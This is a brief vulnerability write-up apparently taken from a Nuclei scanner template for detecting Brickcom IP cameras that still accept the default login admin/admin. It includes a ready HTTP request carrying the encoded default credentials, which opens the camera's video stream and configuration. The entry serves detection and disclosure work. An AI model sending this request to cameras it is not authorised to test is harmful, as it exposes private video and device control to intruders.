# Nuclei Template: Brickcom Camera - Default Login
**Template ID:** brickcom-camera-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`brickcom-camera-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Brickcom IP cameras accessible using default credentials (admin/admin). Successful authentication exposed full camera configuration, live video streams, LED control, and network settings to remote attackers.

## Steps to reproduce / Exploit Payload
```http
GET /index_mjpg.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
```

## References
- https://www.brickcom.com/support/faq_contents.php?id=48
- https://cxsecurity.com/issue/WLB-2026020031
